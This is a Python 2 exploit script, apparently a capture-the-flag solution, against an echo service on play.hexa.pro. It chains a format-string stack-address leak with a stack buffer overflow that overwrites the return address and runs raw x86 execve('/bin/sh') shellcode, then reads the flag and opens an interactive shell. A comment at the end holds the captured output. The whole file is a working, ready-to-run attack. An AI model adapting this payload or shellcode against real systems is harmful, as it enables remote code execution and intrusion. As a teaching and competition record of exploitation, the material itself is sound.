from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

host = 'play.hexa.pro'
port = 12345

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

'''
%70$8x is argv[0] address (i.e. pointer of argv[0], &argv[0])

We will overwrite argv[0] with shellcode by using stack overflow.

Stack structure: [buffer 256 byte] [12 byte dummy] [return address] [8 byte dummy] [argv[0]]
'''

# STAGE 1: Leak stack address 
recv_until(s, "Welcome to HeXA Echo Service!")
s.send("LEAP%70$8x\n")
recv_until(s, "LEAP")

# leaked_addr is address of argv[0] 
leaked_addr = int(s.recv(8),16)

# gdb-peda$ shellcode generate x86/linux exec
# x86/linux/exec: 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

# STAGE 2: Exploit
payload = ""
payload+= "A"*256		  # char buffer[256]
payload+= "B"*12 		  # 12 byte dummy
payload+= pack("<L", leaked_addr) # return address
payload+= "C"*8   		  # 8 byte dummy
payload+= shellcode		  # shellcode

print "[+] Send payload..."
s.send(payload + "\n")

print "[*] You got a shell!"
s.send("cat flag\n")
 
# Interact with server
try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass

'''
[+] Send payload...
[*] You got a shell!

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB▒a▒CCCCCCC1▒Ph//shh/bin▒▒1ɉ▒j
                                                            X̀
What the buggy echo server :(
'''
